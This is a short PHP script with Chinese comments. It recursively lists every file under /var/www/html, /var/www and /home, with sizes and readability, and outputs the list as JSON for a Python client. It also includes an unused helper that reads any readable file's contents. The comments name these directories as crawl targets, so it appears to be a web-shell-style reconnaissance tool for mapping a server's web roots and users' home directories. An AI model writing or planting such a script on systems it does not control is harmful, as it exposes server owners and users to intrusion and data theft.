<?php
// 递归列出所有文件
function listAllFiles($dir, $base = '') {
    $result = [];
    if (!is_dir($dir)) return $result;
    
    $files = @scandir($dir);
    if (!$files) return $result;
    
    foreach($files as $file) {
        if($file == '.' || $file == '..') continue;
        
        $path = $dir . '/' . $file;
        $relativePath = $base ? $base . '/' . $file : $file;
        
        if(is_file($path)) {
            $size = @filesize($path);
            $result[] = [
                'path' => $path,
                'relative' => $relativePath,
                'size' => $size,
                'readable' => is_readable($path)
            ];
        } elseif(is_dir($path)) {
            // 递归子目录
            $result = array_merge($result, listAllFiles($path, $relativePath));
        }
    }
    return $result;
}

// 获取文件内容
function getFileContent($path) {
    if (!is_readable($path)) {
        return null;
    }
    return @file_get_contents($path);
}

// 爬取目标目录
$targets = [
    '/var/www/html',
    '/var/www',
    '/home'
];

$allFiles = [];
foreach($targets as $target) {
    if(is_dir($target)) {
        $files = listAllFiles($target);
        $allFiles = array_merge($allFiles, $files);
    }
}

// 输出JSON格式，方便Python解析
header('Content-Type: application/json');
echo json_encode([
    'success' => true,
    'count' => count($allFiles),
    'files' => $allFiles
], JSON_PRETTY_PRINT);
?>
